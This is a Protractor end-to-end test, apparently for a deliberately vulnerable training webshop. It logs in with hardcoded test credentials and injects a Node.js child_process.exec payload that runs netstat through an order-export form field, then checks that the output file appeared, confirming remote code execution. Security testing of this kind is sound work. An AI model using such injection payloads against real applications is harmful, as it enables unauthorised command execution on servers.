'use strict';
const path = require('path');
const glob = require("glob");
const HelperFunctions = require('../helperFunctions.js');

describe('RCE Injection:', () => {

    beforeEach(() => {
        HelperFunctions.login(browser, 'customer0', 'compass0');
    });

    afterEach(() => {
        HelperFunctions.logout(browser);
    });

    describe('Try to run netstat command', () => {

        beforeEach(() => {
            browser.get(browser.params.webshop);
        });

        it('should be successfully', () => {
            let fileName = 'rceInjection.txt';

            element.all(by.css('.glyphicon.glyphicon-user')).get(0).click();
            browser.sleep(250);
            //Link
            element(by.linkText('Orders')).click();
            browser.sleep(250);
            //Fill form
            element(by.model('orders.export.from')).sendKeys("1");
            element(by.model('orders.export.quantity')).sendKeys("require('child_process').exec('netstat>" + fileName + "')");
            element(by.buttonText('Export pdf')).click();

            let filePath = '../../../' + fileName;

            browser.driver.wait(() => {
                let filesArray = glob.sync(path.join(__dirname, filePath));
                if (typeof filesArray !== 'undefined' && filesArray.length > 0) {
                    return filesArray;
                }
            }, 5000).then((filesArray) => {
                expect(filesArray[0]).toContain(fileName);
            });
        });
    });
});
